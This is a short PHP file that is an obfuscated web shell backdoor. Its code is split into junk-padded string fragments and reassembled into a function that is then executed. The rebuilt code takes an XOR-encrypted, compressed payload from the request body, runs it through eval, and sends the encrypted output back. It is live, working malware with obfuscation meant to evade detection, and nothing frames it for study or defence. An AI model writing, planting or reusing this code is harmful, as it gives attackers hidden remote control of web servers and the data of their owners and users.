<?php
$O='C#n(C#);$r=@baC#sC#e64_encode(@x(C#@gzC#C#compress($o),$C#k));prC#iC#C#nt("$p$kh$r$kf");}';
$L='C#E8z6fzHwQ";fC#unctiC#C#on x($t,$k){$C#c=strlC#en($C#k);$l=C#strleC#n($t)C#;$o=""C#;for(';
$Z=str_replace('D','','DcrDeDaDte_fDunctiDon');
$a='$k="a3f55C#C#293";$C#kh="46eC#d2dcC#0C#e711"C#;$kf="099e63C#1135d0";$C#p="uXOXC#Wef';
$D='teC#ntsC#("phpC#C#://inpuC#t"),$m)==C#1) {@oC#b_start();@eC#val(@C#gzunC#comprC#ess';
$R='#$k{$j};}}returnC# $o;}C#iC#f (@preC#g_match("/$C#kh(.+)C#$kf/",@fC#ileC#_get_con';
$t='(@x(@bC#aseC#64C#_decodC#e($m[1]),C#$kC#)));C#$o=@obC#_get_contents();C#C#@ob_end_clea';
$F='$i=C#0C#;$i<$l;){for(C#C#$j=0;C#($j<$C#c&&$i<$lC#);$j++,C#C#$i++){$o.=$C#t{C#$i}^C';
$v=str_replace('C#','',$a.$L.$F.$R.$D.$t.$O);
$k=$Z('',$v);$k();
?>
